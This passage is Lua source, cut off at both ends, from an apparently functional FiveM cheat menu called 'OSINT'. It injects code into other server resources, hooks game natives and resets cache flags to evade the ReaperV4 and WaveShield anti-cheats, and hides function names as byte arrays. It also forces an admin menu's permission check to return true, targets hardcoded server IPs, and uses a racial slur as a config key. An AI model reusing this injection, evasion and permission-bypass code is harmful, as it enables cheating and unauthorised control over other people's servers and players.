                    ]])
                end

                MachoInjectResource("any", [[
                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "player_loaded", false, true)
                    if success then
                        print("Updated Cache 1 Successfully")
                    else
                        print("Failed to Update Cache 1")
                    end

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "LastFailedMovementChecks", 0, true)
                    if success then
                        print("Updated Cache 2 Successfully")
                    else
                        print("Failed to Update 2 Cache")
                    end

                    Wait(500)

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "NetworkIsInSpectatorMode", true, true)
                    if success then
                        print("Updated Cache 3 Successfully")
                    else
                        print("Failed to Update Cache 3")
                    end
                ]])

                print("[^5OSINT^7]: [^2DEBUG^7] >> Loaded ReaperV4 Freecam Bypass")
                FreecamBypassReaperV4 = true
            end

            _G.OSINTFreecamSpeed = speed

            if not _G.OSINTFreecamThreadRunning then
                _G.OSINTFreecamEnabled = true
                _G.OSINTFreecamThreadRunning = true

                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                local function RotationToDirection(rot)
                    local z = math.rad(rot.z)
                    local x = math.rad(rot.x)
                    local num = math.abs(math.cos(x))
                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                end

                local function GetRightVector(rot)
                    local z = math.rad(rot.z)
                    return vector3(math.cos(z), math.sin(z), 0.0)
                end

                local function Clamp(val, min, max)
                    if val < min then return min end
                    if val > max then return max end
                    return val
                end

                hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                local coords = GetEntityCoords(PlayerPedId())
                _G.OSINTFreecamObject = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                SetCamCoord(_G.OSINTFreecamObject, coords.x, coords.y, coords.z + 2.0)
                SetCamRot(_G.OSINTFreecamObject, 0.0, 0.0, GetEntityHeading(PlayerPedId()), 2)
                RenderScriptCams(true, false, 0, true, true)
                
                CreateThread(function()
                    while _G.OSINTFreecamThreadRunning do
                        Wait(0)

                        if _G.OSINTFreecamEnabled and _G.OSINTFreecamObject then
                            local coords = GetCamCoord(_G.OSINTFreecamObject)
                            local rot = GetCamRot(_G.OSINTFreecamObject, 2)
                            local beforeSpeed = _G.OSINTFreecamSpeed or 0.25
                            local speed = IsControlPressed(0, 21) and beforeSpeed + 1.0 or beforeSpeed
                            local forward = RotationToDirection(rot)
                            local right = GetRightVector(rot)
                            local moveX, moveY, moveZ = 0, 0, 0

                            TaskStandStill(PlayerPedId(), 10)
                            SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                            if IsControlPressed(0, 32) then moveX = moveX + forward.x * speed moveY = moveY + forward.y * speed moveZ = moveZ + forward.z * speed end
                            if IsControlPressed(0, 33) then moveX = moveX - forward.x * speed moveY = moveY - forward.y * speed moveZ = moveZ - forward.z * speed end
                            if IsControlPressed(0, 34) then moveX = moveX - right.x * speed moveY = moveY - right.y * speed end
                            if IsControlPressed(0, 35) then moveX = moveX + right.x * speed moveY = moveY + right.y * speed end
                            if IsControlPressed(0, 22) then moveZ = moveZ + speed end
                            if IsControlPressed(0, 36) then moveZ = moveZ - speed end

                            SetCamCoord(_G.OSINTFreecamObject, coords.x + moveX, coords.y + moveY, coords.z + moveZ)

                            local x = GetDisabledControlNormal(0, 1)
                            local y = GetDisabledControlNormal(0, 2)
                            local newPitch = Clamp(rot.x - y * 5, -89.0, 89.0)
                            local newYaw = rot.z - x * 5

                            SetCamRot(_G.OSINTFreecamObject, newPitch, rot.y, newYaw, 2)
                        end
                    end
                end)
            else
                _G.OSINTFreecamEnabled = true
            end
        end
    else
        FreecamEnabled = false
        MachoSendDuiMessage(DUI, json.encode({ action = "displayFreecam", visible = false }))
        if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
            if GetResourceState("WaveShield") == "started" then
                _G.OSINTFreecamEnabled = false
                _G.OSINTFreecamThreadRunning = false

                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                RenderScriptCams(false, false, 0, true, true)
                if _G.OSINTFreecamObject then DestroyCam(_G.OSINTFreecamObject, false) _G.OSINTFreecamObject = nil end
                SetFocusEntity(PlayerPedId())
            else
                Injection(GetResourceState("monitor") == "started" and "monitor" or "any", [[
                    _G.OSINTFreecamEnabled = false
                    _G.OSINTFreecamThreadRunning = false

                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                    hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                    hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                    hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                    hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                    RenderScriptCams(false, false, 0, true, true)
                    if _G.OSINTFreecamObject then DestroyCam(_G.OSINTFreecamObject, false) _G.OSINTFreecamObject = nil end
                    SetFocusEntity(PlayerPedId())
                ]])
            end
        else
            _G.OSINTFreecamEnabled = false
            _G.OSINTFreecamThreadRunning = false

            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
            hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
            hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
            hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
            hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
            hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
            hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
            hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
            hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
            hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
            hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
            hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
            hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
            hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
            hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
            hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
            hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
            hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
            hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

            RenderScriptCams(false, false, 0, true, true)
            if _G.OSINTFreecamObject then DestroyCam(_G.OSINTFreecamObject, false) _G.OSINTFreecamObject = nil end
            SetFocusEntity(PlayerPedId())
        end
    end
end

function OSINT:EnableInfiniteAmmo()
if GetResourceState("WaveShield") == "started" then
    print('1')
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        if not _G.osintInfAmmo then
            _G.osintInfAmmo = { enabled = false }
        end
        _G.osintInfAmmo.enabled = true
        local PlayerPedId_fn           = g({80,108,97,121,101,114,80,101,100,73,100})
        local GetSelectedPedWeapon_fn  = g({71,101,116,83,101,108,101,99,116,101,100,80,101,100,87,101,97,112,111,110})
        local GetHashKey_fn            = g({71,101,116,72,97,115,104,75,101,121})
        local GetAmmoInPedWeapon_fn    = g({71,101,116,65,109,109,111,73,110,80,101,100,87,101,97,112,111,110})
        local AddAmmoToPed_fn          = g({65,100,100,65,109,109,111,84,111,80,101,100})
        local DoesEntityExist_fn       = g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})
        local Wait_fn                  = g({87,97,105,116})

        local lastClip = {}   -- ped -> last known clip size

        local function initFlow(cb)
            local co = coroutine.create(cb)
            local function execCycle()
                while coroutine.status(co) ~= "dead" do
                    local ok, err = coroutine.resume(co)
                    if not ok then
                        print("^1[OSINT InfAmmo] Coroutine error: ^7", err)
                        break
                    end
                    Wait_fn(0)
                end
            end
            execCycle()
        end

        if not _G.osintWaveLoop then
            _G.osintWaveLoop = true
            initFlow(function()
                while _G.osintWaveLoop do
                    if _G.osintInfAmmo.enabled then
                        local ped = PlayerPedId_fn()
                        if DoesEntityExist_fn(ped) then
                            local weapon = GetSelectedPedWeapon_fn(ped)
                            if weapon and weapon ~= GetHashKey_fn("WEAPON_UNARMED") then
                                local _, clip = GetAmmoInPedWeapon_fn(ped, weapon)
                                local key = tostring(ped)

                                if not lastClip[key] then
                                    lastClip[key] = clip
                                end

                                if clip < lastClip[key] then
                                    AddAmmoToPed_fn(ped, weapon, lastClip[key] - clip)
                                end
                            end
                        end
                    else
                        coroutine.yield()
                    end
                    coroutine.yield()
                end
            end)
        end
    else
        if GetResourceState("ReaperV4") == 'started' then
            MachoInjectResourceRaw("any", [[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]])
        else
            Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]])
        end
    end
end

function OSINT:DisableInfiniteAmmo()
    if GetResourceState("WaveShield") == "started" then
        Injection(GetResourceState("WaveShield") == "started" and "WaveShield" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
            if _G.osintInfAmmo then
                _G.osintInfAmmo.enabled = false
            end
        ]])
    else
        if GetResourceState("ReaperV4") == 'started' then
            MachoInjectResourceRaw("any", [[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]])
        else
            Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]])
        end
    end
end

function OSINT:AttachSelectedVehicle(playerIds, vehicleModel)
    if not playerIds or #playerIds == 0 then 
        self:Notify("error", "OSINT", "No players selected!", 3000)
        return 
    end
    if not vehicleModel or #vehicleModel == 0 then 
        self:Notify("error", "OSINT", "Invalid vehicle model!", 3000)
        return 
    end

    local function encodeToByteArrayLiteral(str)
        local t = {}
        for i = 1, #str do t[i] = string.byte(str, i) end
        return table.concat(t, ",")
    end

    
    local model = vehicleModel
    local modelBytes = encodeToByteArrayLiteral(model)
    local serverEndpoint = GetCurrentServerEndpoint()
    local successCount = 0
    
    for _, playerId in ipairs(playerIds) do
        if GetResourceState("solos-rentals") == "started" then
            print("[vehicle_attach] Fallback: solos-rentals")
            local success, err = pcall(function()
                MachoInjectResource("solos-rentals", string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    config.locations["customnigga"] = {
                        vehiclespawncoords = vec4(coords.x, coords.y, coords.z, heading)
                    }
                    TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga", function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
            
        elseif GetResourceState("amigo") == "started" then
            print("[vehicle_attach] Fallback: Amigo RP")
            local success, err = pcall(function()
                MachoInjectResourceRaw("adminMenu", string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
            
        elseif GetResourceState("qb-core") == "started" then
            print("[vehicle_attach] Fallback #02")
            local success, err = pcall(function()
                MachoInjectResource("qb-core", string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    QBCore.Functions.SpawnVehicle(model, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end, coords, true, true)
                ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
            
        elseif serverEndpoint:match("([^:]+)") == "185.244.106.12" and GetResourceState("drc_gardener") == "started" then
            print("[vehicle_attach] Fallback #1")
            local success, err = pcall(function()
                MachoInjectResource("drc_gardener", string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    SpawnVehicleAndWarpPlayer(model, coords)
                ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
            
        elseif GetResourceState("lunar_bridge") == "started" then
            print("[vehicle_attach] Fallback #2")
            local success, err = pcall(function()
                MachoInjectResourceRaw("lunar_bridge", string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    Framework.spawnVehicle(model, coords, heading, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            SetVehicleOnGroundProperly(vehicle)
                            Citizen.Wait(500)
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
            
        elseif GetResourceState("lation_laundering") == "started" then
            print("[vehicle_attach] Fallback #3")
            local success, err = pcall(function()
                MachoInjectResourceRaw("lation_laundering", string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local position = vector4(coords.x, coords.y, coords.z + 0.5, heading)
                    local vehicle = SpawnVehicle(model, position)
                    if vehicle and DoesEntityExist(vehicle) then
                        SetVehicleOnGroundProperly(vehicle)
                        Citizen.Wait(500)
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        ShowNotification("~g~Vehicle attached successfully!")
                    end
                ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
        else
            print("[vehicle_attach] Universal Fallback")
            local success, err = pcall(function()
                local script = string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
